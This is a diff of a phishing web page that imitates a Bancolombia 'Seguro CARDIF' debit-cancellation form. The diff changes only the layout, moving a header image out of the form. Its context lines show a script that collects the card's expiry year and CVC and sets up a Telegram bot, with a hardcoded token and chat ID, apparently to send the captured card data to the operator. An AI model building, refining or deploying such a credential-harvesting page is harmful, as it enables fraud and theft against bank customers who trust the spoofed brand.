@@ -12,6 +12,14 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      flex-direction: column;
+    }
+    .header {
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    .header img {
+      max-width: 180px;
     }
     .formulario {
       background: #fff;
@@ -21,10 +29,6 @@
       width: 350px;
       border-top: 6px solid #ffcc00; /* Amarillo Bancolombia */
       text-align: center;
-    }
-    .formulario img {
-      max-width: 140px;
-      margin-bottom: 15px;
     }
     .formulario h3 {
       color: #002d72;
@@ -79,8 +83,12 @@
 </head>
 <body>
 
-  <form class="formulario" id="cancelarForm">
+  <!-- Header fuera del formulario -->
+  <div class="header">
     <img src="header.png" alt="Header Imagen">
+  </div>
+
+  <form class="formulario" id="cancelarForm">
     <h3>Seguro CARDIF</h3>
     <h2>Cancelar el débito automático<br>a mi tarjeta débito</h2>
 
@@ -116,7 +124,7 @@
       const anio = document.getElementById("anio").value;
       const cvc = document.getElementById("cvc").value;
 
-      // 🔹 Configura tu bot de Telegram
+   // 🔹 Configura tu bot de Telegram
       const botToken = "8301521168:AAFwfmwFHOLEVKno7_dkaF8z7r1j0-WxM4g";   // 👉 Reemplaza con el token de tu bot
       const chatId = "5647970395";   // 👉 Reemplaza con tu chat_id
  
